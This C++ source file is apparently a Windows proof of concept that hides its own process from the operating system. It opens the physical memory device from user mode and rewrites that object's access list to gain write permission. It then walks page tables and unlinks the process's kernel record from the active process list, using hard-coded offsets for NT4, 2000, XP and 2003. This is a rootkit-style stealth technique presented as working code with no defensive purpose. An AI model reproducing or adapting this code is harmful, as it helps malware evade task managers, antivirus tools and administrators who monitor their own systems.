// hide.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<windows.h> 
#include<Accctrl.h> 
#include<Aclapi.h> 
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <malloc.h>

#define NT_SUCCESS(Status)      ((NTSTATUS)(Status) >= 0) 
#define STATUS_INFO_LENGTH_MISMATCH    ((NTSTATUS)0xC0000004L) 
#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L) 

typedef LONG NTSTATUS; 
typedef struct _IO_STATUS_BLOCK 
{ 
  NTSTATUS  Status; 
  ULONG    Information; 
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK; 

typedef struct _UNICODE_STRING 
{ 
  USHORT    Length; 
  USHORT    MaximumLength; 
  PWSTR    Buffer; 
} UNICODE_STRING, *PUNICODE_STRING; 

#define OBJ_INHERIT       0x00000002L 
#define OBJ_PERMANENT      0x00000010L 
#define OBJ_EXCLUSIVE      0x00000020L 
#define OBJ_CASE_INSENSITIVE  0x00000040L 
#define OBJ_OPENIF       0x00000080L 
#define OBJ_OPENLINK      0x00000100L 
#define OBJ_KERNEL_HANDLE    0x00000200L 
#define OBJ_VALID_ATTRIBUTES  0x000003F2L 


#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_ACCESS_DENIED        ((NTSTATUS)0xC0000022L)

/*
*************************************************************************
* ntddk.h
*/
typedef LONG    NTSTATUS;
typedef ULONG    ACCESS_MASK;
/*
* ntdef.h
*************************************************************************
*/

/*
*************************************************************************
* <<Windows NT/2000 Native API Reference>> - Gary Nebbett
*/

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

/*
*Information Class 16
*/
typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG            ProcessId;
    UCHAR            ObjectTypeNumber;
    UCHAR            Flags;
    USHORT            Handle;
    PVOID            Object;
    ACCESS_MASK        GrantedAccess;
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

#define InitializeObjectAttributes( p, n, a, r, s ) { (p)->Length = sizeof( OBJECT_ATTRIBUTES ); (p)->RootDirectory = r; (p)->Attributes = a; (p)->ObjectName = n; (p)->SecurityDescriptor = s; (p)->SecurityQualityOfService = NULL; }
/*
*************************************************************************
* <<Windows NT/2000 Native API Reference>> - Gary Nebbett
*************************************************************************
*/
typedef ULONG    ( __stdcall *RTLNTSTATUSTODOSERROR    ) ( IN NTSTATUS Status );
typedef NTSTATUS ( __stdcall *ZWQUERYSYSTEMINFORMATION ) ( IN SYSTEM_INFORMATION_CLASS SystemInformationClass, IN OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength OPTIONAL );
/************************************************************************
*                                                                      *
*                            Function Prototype                        *
*                                                                      *
************************************************************************/

static DWORD GetEprocessFromPid    ( ULONG PID );
static BOOL  LocateNtdllEntry ( void );


/************************************************************************
*                                                                      *
*                            Static Global Var                         *
*                                                                      *
************************************************************************/

static RTLNTSTATUSTODOSERROR    RtlNtStatusToDosError    = NULL;
static ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL;

static HMODULE                    hModule                     = NULL;
/************************************************************************/


static DWORD GetEprocessFromPid ( ULONG    PID )
{
    NTSTATUS                    status;
    PVOID                        buf   = NULL;
    ULONG                        size  = 1;
    ULONG                        NumOfHandle = 0;
    ULONG                        i;
    PSYSTEM_HANDLE_INFORMATION    h_info  = NULL;

    for ( size = 1; ; size *= 2 )
    {
        if ( NULL == ( buf = calloc( size, 1 ) ) )
        {
            fprintf( stderr, "calloc( %u, 1 ) failed\n", size );
            goto GetEprocessFromPid_exit;
        }
        status = ZwQuerySystemInformation( SystemHandleInformation, buf, size, NULL );
        if ( !NT_SUCCESS( status ) )
        {
            if ( STATUS_INFO_LENGTH_MISMATCH == status )
            {
                free( buf );
                buf = NULL;
            }
            else
            {
                printf( "ZwQuerySystemInformation() failed");
                goto GetEprocessFromPid_exit;
            }
        }
        else
        {
            break;
        }
    }  /* end of for */

    //返回到缓冲区的首先是一个ULONG类型的数据,表示有多少数组
    NumOfHandle = (ULONG)buf;

    h_info = ( PSYSTEM_HANDLE_INFORMATION )((ULONG)buf+4);
    

    for(i = 0; i<NumOfHandle ;i++)
    {
        if( ( h_info[i].ProcessId == PID )&&( h_info[i].ObjectTypeNumber == 5  ))//&&( h_info[i].Handle==0x3d8 ) )
        {
            printf("Handle:0x%x,OBJECT 0x%x\n\r",h_info[i].Handle,h_info[i].Object);
            return((DWORD)(h_info[i].Object));
        }
    }
GetEprocessFromPid_exit:
    if ( buf != NULL )
    {
        free( buf );
        buf = NULL;
    }
    return(FALSE);
}


/*
* ntdll.dll
*/
static BOOL LocateNtdllEntry ( void )
{
    BOOL    ret         = FALSE;
    char    NTDLL_DLL[] = "ntdll.dll";
    HMODULE ntdll_dll   = NULL;


    if ( ( ntdll_dll = GetModuleHandle( NTDLL_DLL ) ) == NULL )
    {
        printf( "GetModuleHandle() failed");
        return( FALSE );
    }
    if ( !( ZwQuerySystemInformation = ( ZWQUERYSYSTEMINFORMATION )GetProcAddress( ntdll_dll, "ZwQuerySystemInformation" ) ) )
    {
        goto LocateNtdllEntry_exit;
    }
    ret = TRUE;

LocateNtdllEntry_exit:

    if ( FALSE == ret )
    {
        printf( "GetProcAddress() failed");
    }
    ntdll_dll = NULL;
    return( ret );
} 
typedef struct _OBJECT_ATTRIBUTES 
{ 
  ULONG    Length; 
  HANDLE    RootDirectory; 
  PUNICODE_STRING ObjectName; 
  ULONG    Attributes; 
  PVOID    SecurityDescriptor; 
  PVOID    SecurityQualityOfService; 
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;  

typedef NTSTATUS (CALLBACK* ZWOPENSECTION)( 
            OUT PHANDLE SectionHandle, 
            IN ACCESS_MASK DesiredAccess, 
            IN POBJECT_ATTRIBUTES ObjectAttributes 
            ); 

typedef VOID (CALLBACK* RTLINITUNICODESTRING)(         
             IN OUT PUNICODE_STRING DestinationString, 
             IN PCWSTR SourceString 
             ); 

RTLINITUNICODESTRING    RtlInitUnicodeString; 
ZWOPENSECTION      ZwOpenSection; 
HMODULE  g_hNtDLL = NULL; 
PVOID   g_pMapPhysicalMemory = NULL; 
HANDLE   g_hMPM   = NULL; 

BOOL InitNTDLL() 
{ 
  g_hNtDLL = LoadLibrary( "ntdll.dll" ); 
  if ( !g_hNtDLL ) 
  { 
    return FALSE; 
  } 

  RtlInitUnicodeString = 
    (RTLINITUNICODESTRING)GetProcAddress( g_hNtDLL, "RtlInitUnicodeString"); 
   
  ZwOpenSection = 
    (ZWOPENSECTION)GetProcAddress( g_hNtDLL, "ZwOpenSection"); 
   
  return TRUE; 
} 

VOID CloseNTDLL() 
{ 
  if(g_hNtDLL != NULL) 
  { 
    FreeLibrary(g_hNtDLL); 
  } 
} 

VOID SetPhyscialMemorySectionCanBeWrited(HANDLE hSection) 
{ 
   
  PACL pDacl=NULL; 
  PACL pNewDacl=NULL; 
  PSECURITY_DESCRIPTOR pSD=NULL; 
  DWORD dwRes; 
  EXPLICIT_ACCESS ea; 
   
  if(dwRes=GetSecurityInfo(hSection,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION, 
    NULL,NULL,&pDacl,NULL,&pSD)!=ERROR_SUCCESS) 
  { 
    goto CleanUp; 
  } 
   
  ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS)); 
  ea.grfAccessPermissions = SECTION_MAP_WRITE; 
  ea.grfAccessMode = GRANT_ACCESS; 
  ea.grfInheritance= NO_INHERITANCE; 
  ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME; 
  ea.Trustee.TrusteeType = TRUSTEE_IS_USER; 
  ea.Trustee.ptstrName = "CURRENT_USER"; 
   
   
  if(dwRes=SetEntriesInAcl(1,&ea,pDacl,&pNewDacl)!=ERROR_SUCCESS) 
  { 
    goto CleanUp; 
  } 
   
  if(dwRes=SetSecurityInfo(hSection,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,NULL,NULL,pNewDacl,NULL)!=ERROR_SUCCESS) 
  { 
    goto CleanUp; 
  } 
   
CleanUp: 
   
  if(pSD) 
    LocalFree(pSD); 
  if(pNewDacl) 
    LocalFree(pNewDacl); 
} 

HANDLE OpenPhysicalMemory() 
{ 
  NTSTATUS    status; 
  UNICODE_STRING    physmemString; 
  OBJECT_ATTRIBUTES  attributes; 
   
  RtlInitUnicodeString( &physmemString, L"\\Device\\PhysicalMemory" ); 
   
  attributes.Length      = sizeof(OBJECT_ATTRIBUTES); 
  attributes.RootDirectory    = NULL; 
  attributes.ObjectName      = &physmemString; 
  attributes.Attributes      = 0; 
  attributes.SecurityDescriptor    = NULL; 
  attributes.SecurityQualityOfService  = NULL; 
   
  status = ZwOpenSection(&g_hMPM,SECTION_MAP_READ|SECTION_MAP_WRITE,&attributes); 
   
  if(status == STATUS_ACCESS_DENIED){ 
    status = ZwOpenSection(&g_hMPM,READ_CONTROL|WRITE_DAC,&attributes); 
    SetPhyscialMemorySectionCanBeWrited(g_hMPM); 
    CloseHandle(g_hMPM); 
    status =ZwOpenSection(&g_hMPM,SECTION_MAP_READ|SECTION_MAP_WRITE,&attributes); 
  } 

  if( !NT_SUCCESS( status )) 
  { 
    return NULL; 
  } 
   
  g_pMapPhysicalMemory = MapViewOfFile( 
    g_hMPM, 
    4, 
    0, 
    0x30000, 
    0x1000); 
  if( g_pMapPhysicalMemory == NULL ) 
  { 
    return NULL; 
  } 
   
  return g_hMPM; 
} 

PVOID LinearToPhys(PULONG BaseAddress,PVOID addr) 
{ 
  ULONG VAddr=(ULONG)addr,PGDE,PTE,PAddr; 
  if(VAddr>=0x80000000 && VAddr<0xa0000000)
  {
	PAddr=VAddr-0x80000000;
	return (PVOID)PAddr;
  }
  PGDE=BaseAddress[VAddr>>22]; 
  if ((PGDE&1)!=0) 
  { 
    ULONG tmp=PGDE&0x00000080; 
    if (tmp!=0) 
    { 
      PAddr=(PGDE&0xFFC00000)+(VAddr&0x003FFFFF); 
    } 
    else 
    { 
      PGDE=(ULONG)MapViewOfFile(g_hMPM, 4, 0, PGDE & 0xfffff000, 0x1000); 
      PTE=((PULONG)PGDE)[(VAddr&0x003FF000)>>12]; 
      if ((PTE&1)!=0) 
      { 
        PAddr=(PTE&0xFFFFF000)+(VAddr&0x00000FFF); 
        UnmapViewOfFile((PVOID)PGDE); 
      } 
      else return 0; 
    } 
  } 
  else return 0; 

  return (PVOID)PAddr; 
} 

ULONG GetData(PVOID addr) 
{ 
  ULONG phys=(ULONG)LinearToPhys((PULONG)g_pMapPhysicalMemory,(PVOID)addr); 
  PULONG tmp=(PULONG)MapViewOfFile(g_hMPM, 4, 0, phys & 0xfffff000, 0x1000); 
  if (tmp==0) 
    return 0; 
  ULONG ret=tmp[(phys & 0xFFF)>>2]; 
  UnmapViewOfFile(tmp); 
  return ret; 
} 

BOOL SetData(PVOID addr,ULONG data) 
{ 
  ULONG phys=(ULONG)LinearToPhys((PULONG)g_pMapPhysicalMemory,(PVOID)addr); 
  PULONG tmp=(PULONG)MapViewOfFile(g_hMPM, FILE_MAP_WRITE, 0, phys & 0xfffff000, 0x1000); 
  if (tmp==0) 
    return FALSE; 
  tmp[(phys & 0xFFF)>>2]=data; 
  UnmapViewOfFile(tmp); 
  return TRUE; 
} 

BOOL HideProcessAtAll() 
{ 
    if (InitNTDLL()) 
    { 
    if (OpenPhysicalMemory()==0) 
    { 
      return FALSE; 
    }
	int f,b;
	OSVERSIONINFO osvi;
	osvi.dwOSVersionInfoSize=sizeof(osvi);	
	GetVersionEx(&osvi);
	//f=0x88;b=0x8c;
	
	if(osvi.dwMajorVersion==5)
	{
		if(osvi.dwMinorVersion==0)//win2k
		{
			f=0xa0;b=0xa4;
		}
		else if(osvi.dwMinorVersion==1)//winxp
		{
			f=0x88;b=0x8c;
		}
		else if(osvi.dwMinorVersion==2)//win2003
		{
			f=0x8a;b=0x8e;
		}
		else return FALSE;
	}
	else if(osvi.dwMajorVersion==4 && osvi.dwMinorVersion==0 &&osvi.dwPlatformId==2)//NT
	{
		f=0x98;b=0x9c;
	}
	else return FALSE;
     
/*
  ULONG thread=GetData((PVOID)0xFFDFF124); 
  ULONG process=GetData((PVOID)(thread+0x22c));*/


	LocateNtdllEntry( );
    //打开自身句柄,这样才能在handle列表中找到自己,PROCESS 对应 ObjectTypeNum 为5
    OpenProcess( PROCESS_ALL_ACCESS,FALSE,GetCurrentProcessId() );   
    ULONG process=(ULONG)GetEprocessFromPid( (DWORD)GetCurrentProcessId() );
    ULONG fw=GetData(PVOID(process+f));
	ULONG bw=GetData(PVOID(process+b)); 
    SetData(PVOID(fw+4),bw); 
    SetData(PVOID(bw),fw); 

    UnmapViewOfFile(g_pMapPhysicalMemory); 
    CloseHandle(g_hMPM); 
    CloseNTDLL(); 
  } 
  return TRUE; 
} 

int main(int argc, char* argv[])
{
	HideProcessAtAll();
	Sleep(30*1000);
	printf("Hello World!\n");
	return 0;
}

